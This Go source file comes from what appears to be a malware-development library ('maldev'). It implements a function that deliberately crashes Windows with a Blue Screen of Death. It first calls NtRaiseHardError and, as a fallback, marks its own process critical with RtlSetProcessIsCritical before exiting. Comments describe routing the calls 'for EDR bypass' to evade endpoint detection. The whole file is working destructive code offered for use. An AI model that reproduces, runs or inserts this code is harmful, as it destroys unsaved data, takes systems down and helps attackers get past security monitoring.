//go:build windows

package bsod

import (
	"errors"
	"os"
	"unsafe"

	"github.com/oioio-space/maldev/win/api"
	wsyscall "github.com/oioio-space/maldev/win/syscall"
)

var (
	// ErrPrivilege indicates that privilege elevation failed.
	ErrPrivilege = errors.New("privilege adjustment failed")

	// ErrHardError indicates that the hard error call failed.
	ErrHardError = errors.New("hard error call failed")
)

var (
	procRtlAdjustPrivilege       = api.Ntdll.NewProc("RtlAdjustPrivilege")
	procRtlSetProcessIsCritical  = api.Ntdll.NewProc("RtlSetProcessIsCritical")
)

const (
	// seShutdownPrivilege is the privilege index required to shut down the system.
	seShutdownPrivilege = 19
	// seDebugPrivilege is used for RtlSetProcessIsCritical.
	seDebugPrivilege = 20
)

// Trigger causes an immediate Blue Screen of Death.
// This is a DESTRUCTIVE operation — the system will crash immediately
// with no opportunity to save data.
//
// Strategy: first tries NtRaiseHardError (classic approach). If that fails
// to crash the system (Windows 10 22H2+ intercepts it), falls back to
// RtlSetProcessIsCritical + ExitProcess, which marks the current process
// as a critical system process — when it exits, Windows triggers BSOD
// with CRITICAL_PROCESS_DIED.
//
// When caller is non-nil, NtRaiseHardError is routed through the Caller
// for EDR bypass. RtlAdjustPrivilege always uses the WinAPI path since
// it is not typically hooked. Pass nil for standard WinAPI behavior.
//
// This function does not return on success.
func Trigger(caller *wsyscall.Caller) error {
	// Enable SeShutdownPrivilege (for NtRaiseHardError) and
	// SeDebugPrivilege (for RtlSetProcessIsCritical fallback).
	var wasEnabled int32
	r1, _, _ := procRtlAdjustPrivilege.Call(
		seShutdownPrivilege, 1, 0,
		uintptr(unsafe.Pointer(&wasEnabled)),
	)
	if r1 != 0 {
		return ErrPrivilege
	}
	r1, _, _ = procRtlAdjustPrivilege.Call(
		seDebugPrivilege, 1, 0,
		uintptr(unsafe.Pointer(&wasEnabled)),
	)
	if r1 != 0 {
		return ErrPrivilege
	}

	// Method 1: NtRaiseHardError with option 6 (ShutdownSystem).
	// Works on older Windows but intercepted by WER on Windows 10 22H2+.
	var response uint32
	if caller != nil {
		caller.Call("NtRaiseHardError",
			0xDEADDEAD,
			0, 0, 0, 6,
			uintptr(unsafe.Pointer(&response)),
		)
	} else {
		api.Ntdll.NewProc("NtRaiseHardError").Call(
			0xDEADDEAD,
			0, 0, 0, 6,
			uintptr(unsafe.Pointer(&response)),
		)
	}

	// If we're still here, NtRaiseHardError didn't crash.
	// Method 2: Mark process as critical, then exit → CRITICAL_PROCESS_DIED BSOD.
	if err := procRtlSetProcessIsCritical.Find(); err != nil {
		return ErrHardError
	}
	var oldCritical int32
	r1, _, _ = procRtlSetProcessIsCritical.Call(
		1, // bNew = TRUE (mark as critical)
		uintptr(unsafe.Pointer(&oldCritical)),
		0, // bNeedScb = FALSE
	)
	if r1 != 0 {
		return ErrHardError
	}

	// Exit the critical process — kernel will BSOD with CRITICAL_PROCESS_DIED.
	os.Exit(1)

	return nil // unreachable
}
